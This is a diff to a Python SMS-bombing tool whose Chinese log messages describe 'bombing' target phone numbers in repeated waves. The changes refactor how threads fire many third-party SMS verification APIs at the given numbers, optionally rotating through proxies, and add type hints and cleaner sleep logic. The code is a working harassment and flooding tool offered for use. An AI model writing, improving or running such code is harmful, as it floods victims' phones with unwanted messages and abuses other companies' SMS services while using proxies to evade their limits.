@@ -119,28 +119,43 @@ def load_getapi() -> list:
 def run(thread: int, phone: Union[str, tuple], frequency: int, interval: int, enable_proxy: bool = False, api: str = "api.json"):
     """传入线程数和手机号启动轰炸,支持多手机号"""
     logger.info(f"手机号:{phone}, 线程数:{thread}, 执行次数:{frequency}, 间隔时间:{interval}, 接口文件:{api}")
-    print(enable_proxy)
     with ThreadPoolExecutor(max_workers=thread) as pool:
         try:
             _api = load_json(api)
             # _api_get = load_getapi()
-            _proxies = load_proxies()
+            _proxies = load_proxies() if enable_proxy else []
         except ValueError:
             logger.error("读取接口出错!正在重新下载接口数据!....")
             update()
             sys.exit(1)
+
+        if enable_proxy and not _proxies:
+            logger.error("已开启代理模式，但未加载到可用代理")
+            sys.exit(1)
+
         for i in range(1, frequency + 1):
             logger.success(f"第{i}波轰炸开始！")
-            for proxy in _proxies:
-                logger.success(f"第{i}波轰炸 - 当前正在使用代理：" +
-                               proxy['all://'] + " 进行轰炸...") if enable_proxy else logger.success(f"第{i}波开始轰炸...")
-                # 不可用的代理或API过多可能会影响轰炸效果
-                for api in _api:
-                    pool.submit(reqFuncByProxy, api, phone, proxy) if enable_proxy else pool.submit(reqFunc, api, phone)
+
+            if enable_proxy:
+                for proxy in _proxies:
+                    logger.success(f"第{i}波轰炸 - 当前正在使用代理：{proxy['all://']} 进行轰炸...")
+                    # 不可用的代理或API过多可能会影响轰炸效果
+                    for current_api in _api:
+                        pool.submit(reqFuncByProxy, current_api, phone, proxy)
+                    # for api_get in _api_get:
+                    #     pool.submit(reqFuncByProxy, api_get, phone, proxy)
+            else:
+                logger.success(f"第{i}波开始轰炸...")
+                for current_api in _api:
+                    pool.submit(reqFunc, current_api, phone)
                 # for api_get in _api_get:
-                #     pool.submit(reqFuncByProxy, api_get, phone, proxy) if enable_proxy else pool.submit(reqFunc, api_get, phone)
+                #     pool.submit(reqFunc, api_get, phone)
+
+            if i < frequency:
                 logger.success(f"第{i}波轰炸提交结束！休息{interval}s.....")
                 time.sleep(interval)
+            else:
+                logger.success(f"第{i}波轰炸提交结束！")
 
 
 @click.option("--phone", "-p", help="手机号,可传入多个再使用-p传递", prompt=True, required=True, multiple=True)
@@ -151,7 +166,7 @@ def asyncRun(phone, api):
     _api = load_json(api)
     _api_get = load_getapi()
 
-    apis = _api + _api_get
+    apis: List[Union[API, str]] = [*_api, *_api_get]
 
     loop = asyncio.get_event_loop()
     loop.run_until_complete(runAsync(apis, phone))
@@ -165,11 +180,11 @@ def oneRun(phone, api):
     _api = load_json(api)
     _api_get = load_getapi()
 
-    apis = _api + _api_get
+    apis: List[Union[API, str]] = [*_api, *_api_get]
 
-    for api in apis:
+    for current_api in apis:
         try:
-            reqFunc(api, phone)
+            reqFunc(current_api, phone)
         except:
             pass
 
